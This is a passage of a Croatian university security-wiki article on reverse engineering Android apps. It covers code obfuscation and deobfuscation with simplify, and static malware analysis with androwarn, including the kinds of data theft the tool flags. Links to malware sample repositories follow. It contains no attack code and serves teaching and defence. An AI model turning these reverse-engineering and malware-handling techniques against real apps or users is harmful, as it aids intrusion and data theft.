+   public String a(String b){
+       return b;
+}</pre>
+<p>Također, 
+</p>
+<pre>btnNew = changeButtonLabel(btnNew, language.getText(&quot;new&quot;));
+btnOpen = changeButtonLabel(btnOpen, language.getText(&quot;open&quot;));</pre>
+<p>Može postati (a to je samo početak): 
+</p>
+<pre>d =a(d, n.a(&quot;new&quot;));
+e = a(e, n.a(&quot;open&quot;));</pre>
+<p>Za obfuskaciju pri Android developmentu možemo koristiti DexGuard [7].
+</p><p>Deobfuskacija: 
+</p><p>Kako bi deobfuskacijom dobili razumljiv kod, koristimo alat naziva simplify [6]. Simplify pokreće aplikaciju na VM (Virtual Machine), te kod optimiriza kako bismo ga mogli pročitati.
+Primjer: 
+</p>
+<pre>smv.mmj = kut.ger(kut.vav());
+smv.nco = kut.ger(kut.dvf()); </pre>
+<p>Postaje: 
+</p>
+<pre>smv.mmj = &quot;7887&quot;;
+smv.nco = &quot;0203216 00 12 560&quot;;</pre>
+<p><br />
+</p>
+<h2> <span class="mw-headline" id="Stati.C4.8Dka_analiza"> Statička analiza </span></h2>
+<p>Statička analiza predstavlja analizu aplikacije bez pokretanja iste, te uglavnom koristeći već automatizirane alate.Jedan od takvih alata je androwarn [14], koji statičkom analizom Dalvik bytecodea - Smali koda analizira aplikaciju te pokušava pronaći maliciozno ponašanje. Nakon što je analiza gotova, dobivamo report u obliku html dokumenta. 
+</p><p>Alat cilja na sljedeće kategorije: 
+</p>
+<pre>
+Podaci o mobilnom uređaju - IMEI, IMSI, MCC, MNC, LAC, CID, Mobilna mreža
+Verzija Androida, statistika korištenja, postavke, log-ovi...
+GPS/WiFi geolokacija
+WiFi lozinke, Bluetooth MAC adrese
+Premium SMS slanje (kao u primjeru 3), pozivi
+Snimanje razgovora i videa
+Kontakti, kalendar, SMS, Mail
+Pristup podacima na vanjskoj memoriji (SD kartica)</pre>
+<p>Kako bi sa Androwarn alatom statički analizirali aplikaciju, unosimo sljedeću naredbu: 
+</p>
+<pre> python androwarn.py -i SampleApplication/bin/SampleApplication.apk -v 3 -r html -n </pre>
+<p>Izvršio sam statičku analizu za aplikaciju u 3.primjeru, te nam prikazuje postoji li maliciozno ponašanje u kodu. Prikazano je sljedeće (između ostalog): 
+</p>
+<pre>Aplikacija čita numeričko ime mrežnog operatora 
+Logira nelogične stvari unutar koda
+Informacije o certifikatu
+Dozvole koje aplikacija zahtjeva, i slično.
+</pre>
+<h2> <span class="mw-headline" id="Zaklju.C4.8Dak"> Zaključak </span></h2>
+<p>Reverzni inženjering Android aplikacija je dostupan doslovno svima. Jedina teža stvar je razumjeti smali kod, no sve je to izvedivo s vremenom, i metodom "Trial-and-error". Također, apk datoteke malware-a nisu dostupne baš svima, te su ovi noviji (gdje sam ih pronašao), enkriptirani, pa autori traže da se javimo na mail, kako bi dobili password. Nažalost, navedena osoba mi se nije javila, pa nisam uspio obraditi jedan noviji malware. Tema mi se izričito sviđa, te smatram da je ovime tek zagrebena površina. 
+</p>
+<h2> <span class="mw-headline" id="Literatura"> Literatura </span></h2>
+<p>1. Smartphone OS market share, dostupno 12.1.2016 na: <a href="http://www.idc.com/prodserv/smartphone-os-market-share.jsp" class="external free" rel="nofollow">http://www.idc.com/prodserv/smartphone-os-market-share.jsp</a>
+</p><p>2. Android SDK, dostupno 30.12.2015 na: <a href="http://developer.android.com/sdk/index.html" class="external free" rel="nofollow">http://developer.android.com/sdk/index.html</a>
+</p><p>3. Java SE downloads, dostupno 30.12.2015 na <a href="http://www.oracle.com/technetwork/java/javase/downloads/index.html" class="external free" rel="nofollow">http://www.oracle.com/technetwork/java/javase/downloads/index.html</a>
+</p><p>4. Apktool github, dostupno 2.1.2016 na <a href="https://ibotpeaches.github.io/Apktool/" class="external free" rel="nofollow">https://ibotpeaches.github.io/Apktool/</a>
+</p><p>5. Sublime Text, dostupno 30.12.2015 na <a href="http://www.sublimetext.com" class="external free" rel="nofollow">http://www.sublimetext.com</a>
+</p><p>6. Simplify, dostupno 15.1.2016 na <a href="https://github.com/CalebFenton/simplify" class="external free" rel="nofollow">https://github.com/CalebFenton/simplify</a>
+</p><p>7. DexGuard, dostupno 17.1.2016 na <a href="https://www.guardsquare.com/dexguard" class="external free" rel="nofollow">https://www.guardsquare.com/dexguard</a>
+</p><p>8. Mobile Security Wiki, dostupno 10.1.2016 na <a href="https://mobilesecuritywiki.com" class="external free" rel="nofollow">https://mobilesecuritywiki.com</a>
+</p><p>9. Step by step analysis of Android, dostupno 10.1.2016 na <a href="http://blog.nviso.be/2013/06/step-by-step-analysis-of-android.html" class="external free" rel="nofollow">http://blog.nviso.be/2013/06/step-by-step-analysis-of-android.html</a>
+</p><p>10. Contagiomini dump, dostupno 3.1.2016 na <a href="http://contagiominidump.blogspot.be" class="external free" rel="nofollow">http://contagiominidump.blogspot.be</a>
+</p><p>11. Android malware dump, dostupno 10.1.2016 na <a href="http://androidmalwaredump.blogspot.hr" class="external free" rel="nofollow">http://androidmalwaredump.blogspot.hr</a>
+</p><p>12. Find and call application, dostupno 15.1.2016 na <a href="https://securelist.com/blog/incidents/33544/find-and-call-leak-and-spam-57/" class="external free" rel="nofollow">https://securelist.com/blog/incidents/33544/find-and-call-leak-and-spam-57/</a>
+</p><p>13. Reverse engineering Android, dostupno 30.12.2015 na <a href="http://www.syssec-project.eu/m/page-media/158/syssec-summer-school-Android-Code-Injection.pdf" class="external free" rel="nofollow">http://www.syssec-project.eu/m/page-media/158/syssec-summer-school-Android-Code-Injection.pdf</a>
+</p><p>14. Androwarn, dostupan 10.1.2016 na <a href="https://github.com/maaaaz/androwarn/" class="external free" rel="nofollow">https://github.com/maaaaz/androwarn/</a>
+</p><p>15. Dalvik and ART, dostupno 14.1.2016 na <a href="http://opensourceforgeeks.blogspot.hr/2015/02/difference-between-dalvik-and-art.html" class="external free" rel="nofollow">http://opensourceforgeeks.blogspot.hr/2015/02/difference-between-dalvik-and-art.html</a>
+</p><p>16. Android lifecycle, dostupno 30.12.2015 na <a href="http://stackoverflow.com/questions/16293023/android-life-cycle-which-event-fired-only-once-during-the-life-cycle" class="external free" rel="nofollow">http://stackoverflow.com/questions/16293023/android-life-cycle-which-event-fired-only-once-during-the-life-cycle</a>
+</p><p>17. Bytecode viewer, dostupno 5.1.2016 na <a href="https://github.com/Konloch/bytecode-viewer/releases" class="external free" rel="nofollow">https://github.com/Konloch/bytecode-viewer/releases</a>
+</p><p>18. Reverse engineering Android apps, dostupno 30.12.2015 na <a href="http://ttcubicle.blogspot.hr/2015/03/reverse-engineering-closed-source_21.html" class="external free" rel="nofollow">http://ttcubicle.blogspot.hr/2015/03/reverse-engineering-closed-source_21.html</a>
+</p><p>19. Offensive &amp; defensive Android Reverse engineering, dostupno 30.12.2015 na <a href="https://github.com/rednaga/training/tree/master/DEFCON23" class="external free" rel="nofollow">https://github.com/rednaga/training/tree/master/DEFCON23</a>
+</p><p>20. Čudesan svijet reverznog inženjeringa, dostupno 30.12.2015 na <a href="http://www.cis.hr/files/cudesni_re.pdf" class="external free" rel="nofollow">http://www.cis.hr/files/cudesni_re.pdf</a>
+</p><p>21. Zaštita izvornog koda programa, dostupno 15.1.2016 na <a href="http://sigurnost.lss.hr/Novi-dokumenti/zastita-izvornog-koda-programa.html" class="external free" rel="nofollow">http://sigurnost.lss.hr/Novi-dokumenti/zastita-izvornog-koda-programa.html</a>
+</p><p>22. Protect your java code from reverse engineering, dostupno 15.1.2016 na <a href="http://www.thegeekstuff.com/2008/06/protect-your-java-code-from-reverse-engineering/" class="external free" rel="nofollow">http://www.thegeekstuff.com/2008/06/protect-your-java-code-from-reverse-engineering/</a>
+</p><p>23. How obfuscation helps protect Java from reverse engineering, dostupno 15.1.2016 na <a href="http://www.techrepublic.com/blog/software-engineer/how-obfuscation-helps-protect-java-from-reverse-engineering/" class="external free" rel="nofollow">http://www.techrepublic.com/blog/software-engineer/how-obfuscation-helps-protect-java-from-reverse-engineering/</a>
+</p>
+<!-- 
+NewPP limit report
+Preprocessor node count: 246/1000000
+Post-expand include size: 0/2097152 bytes
+Template argument size: 0/2097152 bytes
+Expensive parser function count: 0/100
+-->
+
+<!-- Saved in parser cache with key sisds:pcache:idhash:8672-0!*!0!!hr!2!edit=0 and timestamp 20190203204218 -->
+<div class="printfooter">
+Dobavljeno iz "<a href="Reverzni_inžinjering_Android_aplikacija.html">http://security.foi.hr/wiki/index.php/Reverzni_in%C5%BEinjering_Android_aplikacija</a>"</div>
+				<!-- /bodytext -->
+								<!-- catlinks -->
+				<div id='catlinks' class='catlinks catlinks-allhidden'></div>				<!-- /catlinks -->
+												<div class="visualClear"></div>
+			</div>
+			<!-- /bodyContent -->
+		</div>
+		<!-- /content -->
+		<!-- header -->
+		<div id="mw-head" class="noprint">
+			
+<!-- 0 -->
+<div id="p-personal" class="">
+	<h5>Osobni alati</h5>
+	<ul>
+					<li  id="pt-login"><a href="http://security.foi.hr/wiki/index.php?title=Posebno:Prijava&amp;returnto=Reverzni_in%C5%BEinjering_Android_aplikacija" title="Predlažemo Vam da se prijavite, ali nije obvezno. [o]" accesskey="o">Prijavi se</a></li>
+			</ul>
+</div>
+
+<!-- /0 -->
+			<div id="left-navigation">
+				
+<!-- 0 -->
+<div id="p-namespaces" class="vectorTabs">
+	<h5>Imenski prostori</h5>
+	<ul>
+					<li  id="ca-nstab-main" class="selected"><span><a href="Reverzni_inžinjering_Android_aplikacija.html"  title="Pogledaj sadržaj [c]" accesskey="c">Članak</a></span></li>
+					<li  id="ca-talk" class="new"><span><a href="http://security.foi.hr/wiki/index.php?title=Razgovor:Reverzni_in%C5%BEinjering_Android_aplikacija&amp;action=edit&amp;redlink=1"  title="Razgovor o stranici [t]" accesskey="t">Razgovor</a></span></li>
+			</ul>
+</div>
+
+<!-- /0 -->
+
+<!-- 1 -->
+<div id="p-variants" class="vectorMenu emptyPortlet">
+		<h5><span>Inačice</span><a href="Reverzni_inžinjering_Android_aplikacija.html#"></a></h5>
+	<div class="menu">
+		<ul>
+					</ul>
+	</div>
+</div>
+
+<!-- /1 -->
+			</div>
+			<div id="right-navigation">
+				
+<!-- 0 -->
+<div id="p-views" class="vectorTabs">
+	<h5>Pogledi</h5>
+	<ul>
+					<li id="ca-view" class="selected"><span><a href="Reverzni_inžinjering_Android_aplikacija.html" >Čitaj</a></span></li>
+					<li id="ca-viewsource"><span><a href="http://security.foi.hr/wiki/index.php?title=Reverzni_in%C5%BEinjering_Android_aplikacija&amp;action=edit"  title="Ova stranica je zaštićena. Možete pogledati izvorni kod. [e]" accesskey="e">Vidi izvor</a></span></li>
+					<li id="ca-history" class="collapsible "><span><a href="http://security.foi.hr/wiki/index.php?title=Reverzni_in%C5%BEinjering_Android_aplikacija&amp;action=history"  title="Ranije izmjene na ovoj stranici. [h]" accesskey="h">Vidi stare izmjene</a></span></li>
+			</ul>
+</div>
+
+<!-- /0 -->
+
+<!-- 1 -->
+<div id="p-cactions" class="vectorMenu emptyPortlet">
+	<h5><span>Radnje</span><a href="Reverzni_inžinjering_Android_aplikacija.html#"></a></h5>
+	<div class="menu">
+		<ul>
+					</ul>
+	</div>
+</div>
+
+<!-- /1 -->
+
+<!-- 2 -->
+<div id="p-search">
+	<h5><label for="searchInput">Traži</label></h5>
+	<form action="http://security.foi.hr/wiki/index.php" id="searchform">
+		<input type='hidden' name="title" value="Posebno:Traži"/>
+				<input id="searchInput" name="search" type="text"  title="Pretraži ovaj wiki [f]" accesskey="f"  value="" />
+		<input type='submit' name="go" class="searchButton" id="searchGoButton"	value="Kreni" title="Idi na stranicu s ovim imenom ako ona postoji" />
+		<input type="submit" name="fulltext" class="searchButton" id="mw-searchButton" value="Traži" title="Traži ovaj tekst na svim stranicama" />
+			</form>
+</div>
+
+<!-- /2 -->
+			</div>
+		</div>
+		<!-- /header -->
+		<!-- panel -->
+			<div id="mw-panel" class="noprint">
+				<!-- logo -->
+					<div id="p-logo"><a style="background-image: url(../../images/osslogo.png);" href="../../wiki.html"  title="Glavna stranica"></a></div>
+				<!-- /logo -->
+				
+<!-- navigation -->
+<div class="portal" id='p-navigation'>
+	<h5>Orijentacija</h5>
+	<div class="body">
+				<ul>
+					<li id="n-mainpage-description"><a href="../../wiki.html" title="Posjeti glavnu stranicu [z]" accesskey="z">Glavna stranica</a></li>
+					<li id="n-portal"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Portal_zajednice" title="O projektu, što možete učiniti, gdje je što">Portal zajednice</a></li>
+					<li id="n-currentevents"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Novosti" title="O trenutačnim događajima">Aktualno</a></li>
+					<li id="n-recentchanges"><a href="./Posebno:Nedavne_promjene.html" title="Popis nedavnih promjena u wikiju. [r]" accesskey="r">Nedavne promjene</a></li>
+					<li id="n-randompage"><a href="./Posebno:Slučajna_stranica.html" title="Učitaj slučajnu stranicu [x]" accesskey="x">Slučajna stranica</a></li>
+					<li id="n-help"><a href="./Pomoć:Pomoć.html" title="Mjesto za pomoć suradnicima.">Pomoć</a></li>
+				</ul>
+			</div>
+</div>
+
+<!-- /navigation -->
+
+<!-- SEARCH -->
+
+<!-- /SEARCH -->
+
+<!-- TOOLBOX -->
+<div class="portal" id="p-tb">
+	<h5>Traka s alatima</h5>
+	<div class="body">
+		<ul>
+					<li id="t-whatlinkshere"><a href="http://security.foi.hr/wiki/index.php/Posebno:%C5%A0to_vodi_ovamo/Reverzni_in%C5%BEinjering_Android_aplikacija" title="Popis svih stranica koje sadrže poveznice ovamo [j]" accesskey="j">Što vodi ovamo</a></li>
+						<li id="t-recentchangeslinked"><a href="http://security.foi.hr/wiki/index.php/Posebno:Povezane_promjene/Reverzni_in%C5%BEinjering_Android_aplikacija" title="Nedavne promjene na stranicama na koje vode ovdašnje poveznice [k]" accesskey="k">Povezane stranice</a></li>
+																																										<li id="t-specialpages"><a href="./Posebno:Posebne_stranice.html" title="Popis posebnih stranica [q]" accesskey="q">Posebne stranice</a></li>
+									<li id="t-print"><a href="http://security.foi.hr/wiki/index.php?title=Reverzni_in%C5%BEinjering_Android_aplikacija&amp;printable=yes" rel="alternate" title="Verzija za ispis ove stranice [p]" accesskey="p">Verzija za ispis</a></li>
+						<li id="t-permalink"><a href="http://security.foi.hr/wiki/index.php?title=Reverzni_in%C5%BEinjering_Android_aplikacija&amp;oldid=36957" title="Trajna poveznica na ovu verziju stranice">Trajna poveznica</a></li>
+						</ul>
+	</div>
+</div>
+
+<!-- /TOOLBOX -->
+
+<!-- LANGUAGES -->
+
+<!-- /LANGUAGES -->
+			</div>
+		<!-- /panel -->
+		<!-- footer -->
+		<div id="footer">
+											<ul id="footer-info">
+																	<li id="footer-info-lastmod"> Datum zadnje promjene na ovoj stranici: 21:50, 17. siječnja 2016.</li>
+																							<li id="footer-info-viewcount">Ova stranica je pogledana 1.431 put.</li>
+																							<li id="footer-info-copyright">Sadržaji se koriste u skladu s <a href="http://creativecommons.org/licenses/by-sa/3.0/" class="external ">Creative Commons Attribution Share Alike</a>.</li>
+															</ul>
+															<ul id="footer-places">
+																	<li id="footer-places-privacy"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Za%C5%A1tita_privatnosti" title="SIS Wiki:Zaštita privatnosti">Zaštita privatnosti</a></li>
+																							<li id="footer-places-about"><a href="./SIS_Wiki:O_projektu_SIS_Wiki.html" title="SIS Wiki:O projektu SIS Wiki">O projektu SIS Wiki</a></li>
+																							<li id="footer-places-disclaimer"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:General_disclaimer" title="SIS Wiki:General disclaimer">Odricanje od odgovornosti</a></li>
+															</ul>
+											<ul id="footer-icons" class="noprint">
+					<li id="footer-copyrightico">
+						<a href="http://creativecommons.org/licenses/by-sa/3.0/"><img src="../skins/common/images/cc-by-sa.png" alt="Creative Commons Attribution Share Alike" width="88" height="31" /></a>
+					</li>
+					<li id="footer-poweredbyico">
+						<a href="http://www.mediawiki.org/"><img src="../skins/common/images/poweredby_mediawiki_88x31.png" alt="Powered by MediaWiki" width="88" height="31" /></a>
+					</li>
+				</ul>
+						<div style="clear:both"></div>
+		</div>
+		<!-- /footer -->
+		
+<script src="../load.php%3Fdebug=false&amp;lang=hr&amp;modules=startup&amp;only=scripts&amp;skin=vector&amp;*"></script>
+<script>if ( window.mediaWiki ) {
+	mediaWiki.config.set({"wgCanonicalNamespace": "", "wgCanonicalSpecialPageName": false, "wgNamespaceNumber": 0, "wgPageName": "Reverzni_inžinjering_Android_aplikacija", "wgTitle": "Reverzni inžinjering Android aplikacija", "wgAction": "view", "wgArticleId": 8672, "wgIsArticle": true, "wgUserName": null, "wgUserGroups": ["*"], "wgCurRevisionId": 36957, "wgCategories": [], "wgBreakFrames": false, "wgRestrictionEdit": [], "wgRestrictionMove": []});
+}
+</script>
+<script>if ( window.mediaWiki ) {
+	mediaWiki.loader.load(["mediawiki.util", "mediawiki.legacy.wikibits", "mediawiki.legacy.ajax"]);
+	mediaWiki.loader.go();
+}
+</script>
+
+<script>if ( window.mediaWiki ) {
+	mediaWiki.user.options.set({"ccmeonemails":0,"cols":80,"contextchars":50,"contextlines":5,"date":"default","diffonly":0,"disablemail":0,"disablesuggest":0,"editfont":"default","editondblclick":0,"editsection":1,"editsectiononrightclick":0,"enotifminoredits":0,"enotifrevealaddr":0,"enotifusertalkpages":1,"enotifwatchlistpages":0,"extendwatchlist":0,"externaldiff":0,"externaleditor":0,"fancysig":0,"forceeditsummary":0,"gender":"unknown","hideminor":0,"hidepatrolled":0,"highlightbroken":1,"imagesize":2,"justify":0,"math":1,"minordefault":0,"newpageshidepatrolled":0,"nocache":0,"noconvertlink":0,"norollbackdiff":0,"numberheadings":0,"previewonfirst":0,"previewontop":1,"quickbar":1,"rcdays":7,"rclimit":50,"rememberpassword":0,"rows":25,"searchlimit":20,"showhiddencats":0,"showjumplinks":1,"shownumberswatching":1,"showtoc":1,"showtoolbar":1,"skin":"vector","stubthreshold":0,"thumbsize":2,"underline":2,"uselivepreview":0,"usenewrc":0,"watchcreations":0,"watchdefault":0,"watchdeletion":0,
+	"watchlistdays":3,"watchlisthideanons":0,"watchlisthidebots":0,"watchlisthideliu":0,"watchlisthideminor":0,"watchlisthideown":0,"watchlisthidepatrolled":0,"watchmoves":0,"wllimit":250,"variant":"hr","language":"hr","searchNs0":true,"searchNs1":false,"searchNs2":false,"searchNs3":false,"searchNs4":false,"searchNs5":false,"searchNs6":false,"searchNs7":false,"searchNs8":false,"searchNs9":false,"searchNs10":false,"searchNs11":false,"searchNs12":false,"searchNs13":false,"searchNs14":false,"searchNs15":false});;mediaWiki.loader.state({"user.options":"ready"});
+}
+</script>		<!-- fixalpha -->
+		<script type="text/javascript"> if ( window.isMSIE55 ) fixalpha(); </script>
+		<!-- /fixalpha -->
+		<!-- Served in 0.514 secs. -->			</body>
+</html>
